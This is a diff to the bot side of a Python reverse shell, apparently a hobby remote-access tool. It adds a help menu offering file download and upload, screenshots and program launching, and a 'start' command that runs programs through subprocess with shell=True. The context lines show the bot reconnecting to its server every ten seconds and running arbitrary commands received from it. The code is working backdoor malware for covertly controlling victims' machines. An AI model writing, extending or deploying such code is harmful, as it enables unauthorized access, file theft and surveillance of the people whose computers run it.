@@ -33,7 +33,7 @@ def reliable_recv():
             continue
 
 
-# Checking for connection every x seconds
+# Checking for connection every x seconds. This is for when bot executes the prog but the server hasn't been set up yet!
 def connection():
     while True:
         time.sleep(10)
@@ -65,6 +65,19 @@ def shell():
         # Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
         if command == 'q':
             break
+
+        # Showing help
+        elif command == 'help':
+                help_opts = """
+                            download <path>     --> download a file from bot
+                            upload <path>       --> upload a file to bot
+                            screenshot          --> take screenshot of bot
+                            start <path>        --> start a program (Windows preferred)
+                            q                   --> exit the reverse shell
+                """
+
+                reliable_send(help_opts)
+        # Changing directory
         elif command[:2] == "cd" and len(command) > 1:
             try:
                 os.chdir(command[3:])
@@ -98,6 +111,14 @@ def shell():
                 os.remove("monitor-1.png")
             except: 
                 reliable_send("[-] Failed to take screenshot!")
+        
+        # Start a command --> Best for windows, not needed much for linux
+        elif command[:5] == "start":
+            try:
+                sp.Popen(command[6:], shell=True)
+                reliable_send("[+] Program Started!")
+            except:
+                reliable_send("[-] Failed To Start!")
         else:
             proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
             result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))
